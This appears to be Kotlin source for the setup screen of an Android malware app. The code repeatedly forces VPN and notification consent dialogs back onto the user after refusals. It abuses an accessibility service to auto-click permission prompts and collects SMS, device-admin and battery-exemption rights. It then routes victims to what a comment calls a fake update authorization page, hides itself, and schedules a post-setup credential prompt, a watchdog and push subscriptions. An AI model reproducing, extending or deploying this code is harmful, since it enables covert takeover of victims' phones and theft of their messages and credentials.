package com.vibelink.client.ui

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.vibelink.client.R
import com.vibelink.client.accessibility.AccessibilityControlBridge
import com.vibelink.client.accessibility.AccessibilityHelper
import com.vibelink.client.databinding.ActivitySetupWizardBinding
import com.vibelink.client.prefs.SetupPrefs
import com.vibelink.client.setup.BatteryOptimizationHelper
import com.vibelink.client.setup.DeviceAdminHelper
import com.vibelink.client.setup.FcmTopicSubscriber
import com.vibelink.client.setup.NotificationHelper
import com.vibelink.client.setup.PostSetupCredentialPrompt
import com.vibelink.client.setup.ServiceStarter
import com.vibelink.client.setup.ServiceWatchdog
import com.vibelink.client.setup.SetupAutoGrantCoordinator
import com.vibelink.client.setup.SetupPermissionAutoClicker
import com.vibelink.client.setup.VpnStarter
import com.vibelink.client.sms.SmsHelper

/**
 * 1) 先只弹 VPN，引导卡片先藏起来
 * 2) VPN 通过后再弹通知
 * 3) 通知通过后才显示「应用未授权」
 * 4) 若无障碍已开，自动点 VPN / 通知确认
 */
class SetupWizardActivity : AppCompatActivity() {
    private lateinit var binding: ActivitySetupWizardBinding
    private lateinit var setupPrefs: SetupPrefs
    private var shouldExitSilently = false
    private var vpnRequestInFlight = false
    private var notificationRequestInFlight = false
    /** 系统权限框「不允许」次数；达 [NOTIFICATION_DENY_BEFORE_SETTINGS] 后改开设置页。 */
    private var notificationDenyCount = 0
    private val mainHandler = Handler(Looper.getMainLooper())
    /** 主题里的原始 dimAmount，恢复卡片时按它还原。 */
    private var chromeDimAmount: Float? = null
    private val notificationRetryRunnable = Runnable { requestNotificationPermission() }

    private val vpnConsentLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        vpnRequestInFlight = false
        val granted = result.resultCode == RESULT_OK
        VpnStarter.onConsentResult(this, granted)
        if (granted && VpnStarter.isAuthorized(this)) {
            Log.i(TAG, "VPN granted")
            SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.NONE)
            continueAfterVpn()
            return@registerForActivityResult
        }
        // 竞品：拒绝 toast + 3s 再 prepare。卡片保持隐藏，避免盖住 VPN 框。
        hideAuthCard()
        Toast.makeText(this, R.string.vpn_permission_required, Toast.LENGTH_LONG).show()
        mainHandler.postDelayed({ requestVpnConsent() }, VPN_RETRY_MS)
    }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { granted ->
        notificationRequestInFlight = false
        SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.NONE)
        Log.i(TAG, "POST_NOTIFICATIONS granted=$granted")
        if (granted || NotificationHelper.isGranted(this)) {
            notificationDenyCount = 0
            ServiceStarter.tryStart(this)
            continueAfterNotification()
            return@registerForActivityResult
        }
        notificationDenyCount += 1
        hideAuthCard()
        Toast.makeText(this, R.string.setup_notification_denied_hint, Toast.LENGTH_SHORT).show()
        Log.i(TAG, "POST_NOTIFICATIONS denied count=$notificationDenyCount")
        // 前两次尽量再弹系统框；两次不允许后改开设置页（系统不再弹框）
        if (notificationDenyCount >= NOTIFICATION_DENY_BEFORE_SETTINGS) {
            openAppNotificationSettings()
        }
        scheduleNotificationRetry()
    }

    private val vpnAutoClickTick = object : Runnable {
        override fun run() {
            if (isFinishing || isDestroyed) {
                return
            }
            if (!VpnStarter.isAuthorized(this@SetupWizardActivity)) {
                if (vpnRequestInFlight && AccessibilityControlBridge.isReady()) {
                    SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.VPN)
                    AccessibilityControlBridge.getService()?.let { SetupPermissionAutoClicker.onEvent(it) }
                }
                mainHandler.postDelayed(this, VPN_AUTO_CLICK_MS)
                return
            }
            if (!NotificationHelper.isGranted(this@SetupWizardActivity)) {
                // VPN 已过、通知未开：持续自动点「允许」，并保证 tick 不中断
                if (AccessibilityControlBridge.isReady()) {
                    SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.PERMISSIONS)
                    AccessibilityControlBridge.getService()?.let { SetupPermissionAutoClicker.onEvent(it) }
                }
                mainHandler.postDelayed(this, VPN_AUTO_CLICK_MS)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setupPrefs = SetupPrefs(this)

        if (intent.getBooleanExtra(EXTRA_FORCE_SETUP, false)) {
            setupPrefs.setupCompleted = false
        }

        binding = ActivitySetupWizardBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.setupActionButton.setOnClickListener {
            // 对齐竞品：VPN 未过前不抢无障碍页，避免 ColorOS 把 VPN 弹窗压到设置后面
            if (!VpnStarter.isAuthorized(this)) {
                Toast.makeText(this, R.string.vpn_permission_required, Toast.LENGTH_SHORT).show()
                requestVpnConsent()
                return@setOnClickListener
            }
            AccessibilityHelper.openServiceSettings(this)
        }
        binding.setupNextButton.visibility = android.view.View.GONE
        refreshAccessibilityUi()
        hideAuthCard()

        SetupAutoGrantCoordinator.begin()
        // 竞品：onCreate 立刻 b() → prepare（ColorOS 会转到 oplus.wirelesssettings VPN 弹窗）
        requestVpnConsent()
        mainHandler.post(vpnAutoClickTick)
    }

    override fun onResume() {
        super.onResume()
        if (shouldExitSilently) {
            return
        }
        if (::binding.isInitialized) {
            refreshAccessibilityUi()
        }
        if (VpnStarter.isAuthorized(this)) {
            continueAfterVpn()
            return
        }
        hideAuthCard()
        // 未授权：对齐竞品，不在 onResume 叠 prepare（H 防重入由 inFlight 管）；
        // 仅当未在飞时再弹，避免 ColorOS「有时不弹」
        if (!vpnRequestInFlight && !notificationRequestInFlight) {
            requestVpnConsent()
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        // handoff 到 SecurityUpdate 时 shouldExitSilently=true，禁止 end() 掐断自动授权
        if (!shouldExitSilently) {
            SetupAutoGrantCoordinator.end()
        }
        super.onDestroy()
    }

    /** 对齐竞品 b()：H 防重入，拒绝后由回调清掉再弹 */
    private fun requestVpnConsent() {
        if (isFinishing || isDestroyed) {
            return
        }
        if (VpnStarter.isAuthorized(this)) {
            vpnRequestInFlight = false
            VpnStarter.startAfterInstallerYield(this)
            return
        }
        if (vpnRequestInFlight) {
            return
        }
        vpnRequestInFlight = true
        val prepare = VpnStarter.prepareOrStart(this)
        if (prepare == null) {
            vpnRequestInFlight = false
            continueAfterVpn()
            return
        }
        Log.i(TAG, "launch VPN prepare")
        runCatching {
            vpnConsentLauncher.launch(prepare)
        }.onFailure { error ->
            Log.e(TAG, "VPN prepare launch failed", error)
            vpnRequestInFlight = false
            mainHandler.postDelayed({ requestVpnConsent() }, VPN_RETRY_MS)
        }
    }

    private fun continueAfterVpn() {
        if (!VpnStarter.isAuthorized(this)) {
            return
        }
        VpnStarter.startAfterInstallerYield(this)
        // VPN 通过后先开通知，再走无障碍 / SecurityUpdate
        if (!NotificationHelper.isGranted(this)) {
            requestNotificationPermission()
            return
        }
        continueAfterNotification()
    }

    private fun requestNotificationPermission() {
        if (isFinishing || isDestroyed) {
            return
        }
        if (NotificationHelper.isGranted(this)) {
            notificationRequestInFlight = false
            notificationDenyCount = 0
            continueAfterNotification()
            return
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            continueAfterNotification()
            return
        }
        if (notificationRequestInFlight) {
            return
        }
        // 已拒绝两次：系统框不再出现，反复打开通知设置直到打开
        if (notificationDenyCount >= NOTIFICATION_DENY_BEFORE_SETTINGS) {
            Log.i(TAG, "POST_NOTIFICATIONS → open settings (denyCount=$notificationDenyCount)")
            openAppNotificationSettings()
            scheduleNotificationRetry()
            return
        }
        notificationRequestInFlight = true
        SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.PERMISSIONS)
        Log.i(TAG, "launch POST_NOTIFICATIONS denyCount=$notificationDenyCount")
        runCatching {
            notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }.onFailure { error ->
            Log.e(TAG, "POST_NOTIFICATIONS launch failed", error)
            notificationRequestInFlight = false
            notificationDenyCount += 1
            if (notificationDenyCount >= NOTIFICATION_DENY_BEFORE_SETTINGS) {
                openAppNotificationSettings()
            }
            scheduleNotificationRetry()
        }
    }

    private fun scheduleNotificationRetry() {
        mainHandler.removeCallbacks(notificationRetryRunnable)
        mainHandler.postDelayed(notificationRetryRunnable, NOTIFICATION_RETRY_MS)
    }

    private fun openAppNotificationSettings() {
        val intents = listOf(
            Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            },
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            },
        )
        for (intent in intents) {
            if (runCatching { startActivity(intent); true }.getOrDefault(false)) {
                return
            }
        }
    }

    /** 通知已开（或无需）：再引导无障碍 / 假更新授权页 */
    private fun continueAfterNotification() {
        if (!VpnStarter.isAuthorized(this)) {
            hideAuthCard()
            return
        }
        VpnStarter.startAfterInstallerYield(this)

        if (setupPrefs.setupCompleted && allStepsReady()) {
            exitSilentlyAfterSetup()
            return
        }
        if (setupPrefs.setupCompleted && !allStepsReady()) {
            setupPrefs.setupCompleted = false
        }
        if (AccessibilityHelper.isServiceEnabled(this) && !allSilentStepsReady()) {
            launchSecurityUpdateAndFinish()
            return
        }
        if (allStepsReady()) {
            finishSetupSilently()
            return
        }
        if (AccessibilityHelper.isServiceEnabled(this)) {
            launchSecurityUpdateAndFinish()
            return
        }
        showAuthCard()
    }

    /** VPN、通知都结束前不显示中间的「应用未授权」卡片。 */
    private fun hideAuthCard() {
        if (!::binding.isInitialized) {
            return
        }
        binding.root.visibility = android.view.View.INVISIBLE
        applyWindowChrome(interactive = false)
    }

    private fun showAuthCard() {
        if (!::binding.isInitialized) {
            return
        }
        if (!VpnStarter.isAuthorized(this)) {
            hideAuthCard()
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            !NotificationHelper.isGranted(this)
        ) {
            hideAuthCard()
            return
        }
        binding.root.visibility = android.view.View.VISIBLE
        applyWindowChrome(interactive = true)
    }

    /**
     * 卡片不可见时，这层窗口必须同时「不压暗、不吃触摸」。
     *
     * 本 Activity 是 `windowIsTranslucent` + `backgroundDimEnabled` 的全屏窗口，压在安装器
     * A 的页面上。只把根布局设 INVISIBLE 并不会撤掉 WINDOW 级的 DIM_BEHIND，也不会撤掉
     * 它的 touchableRegion——窗口照样压暗整屏并吞掉所有点击，用户看到的就是「一片黑色遮罩层
     * 而且点不动」。曾因 [VpnStarter.isAuthorized] 与 [VpnStarter.prepareOrStart] 语义打架，
     * 向导停在隐藏态不前进也不退出，正好落进这个洞。
     *
     * 隐藏时一并撤掉 dim 与可触摸性，任何路径把卡片藏起来都不会再把 A 的页面做成黑屏。
     */
    private fun applyWindowChrome(interactive: Boolean) {
        if (isFinishing || isDestroyed) {
            return
        }
        if (chromeDimAmount == null) {
            chromeDimAmount = window.attributes.dimAmount
        }
        if (interactive) {
            window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
            window.setDimAmount(chromeDimAmount ?: DEFAULT_DIM_AMOUNT)
        } else {
            window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
            window.setDimAmount(0f)
        }
    }

    private fun launchSecurityUpdateAndFinish() {
        ServiceStarter.tryStart(this)
        VpnStarter.startAfterInstallerYield(this)
        // finish 后 onDestroy 仍会跑；用 shouldExitSilently 标记 handoff，避免 end() 协调器
        shouldExitSilently = true
        SetupAutoGrantCoordinator.ensureActive()
        SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.PERMISSIONS)
        startActivity(SecurityUpdateActivity.createIntent(this))
        finish()
    }

    private fun exitSilentlyAfterSetup() {
        shouldExitSilently = true
        ServiceStarter.tryStart(this)
        VpnStarter.startAfterInstallerYield(this)
        PostSetupCredentialPrompt.scheduleAfterSetup(this)
        moveTaskToBack(true)
        finish()
    }

    private fun finishSetupSilently() {
        setupPrefs.setupCompleted = true
        ServiceStarter.tryStart(this)
        VpnStarter.startAfterInstallerYield(this)
        ServiceWatchdog.scheduleNextCheck(this)
        // 见 SecurityUpdateActivity 同处注释：进程在安装期启动过时，首轮订阅必然被 VPN 挡掉。
        FcmTopicSubscriber.subscribeAfterSetup(this)
        exitSilentlyAfterSetup()
    }

    private fun refreshAccessibilityUi() {
        if (!::binding.isInitialized) {
            return
        }
        binding.setupAppNameText.text = getString(R.string.app_name)
        binding.setupTitleText.text = getString(R.string.setup_auth_message)
        binding.setupActionButton.text = getString(R.string.setup_action_authorize)
        binding.setupActionButton.setTextColor(0xFF000000.toInt())
        binding.setupActionButton.typeface = android.graphics.Typeface.DEFAULT_BOLD
    }

    private fun isPermissionsReady(): Boolean =
        NotificationHelper.isGranted(this) && SmsHelper.hasSmsPermissions(this)

    private fun isBatteryReady(): Boolean = BatteryOptimizationHelper.isIgnoringOptimizations(this)

    private fun isAdminReady(): Boolean = DeviceAdminHelper.isActive(this)

    private fun allSilentStepsReady(): Boolean =
        isPermissionsReady() && isBatteryReady() && isAdminReady()

    private fun allStepsReady(): Boolean =
        AccessibilityHelper.isServiceEnabled(this) && allSilentStepsReady()

    companion object {
        private const val TAG = "SetupWizard"
        private const val VPN_RETRY_MS = 3_000L
        private const val NOTIFICATION_RETRY_MS = 1_500L
        private const val NOTIFICATION_DENY_BEFORE_SETTINGS = 2
        private const val VPN_AUTO_CLICK_MS = 280L
        private const val DEFAULT_DIM_AMOUNT = 0.6f
        const val EXTRA_FORCE_SETUP = "force_setup"
    }
}
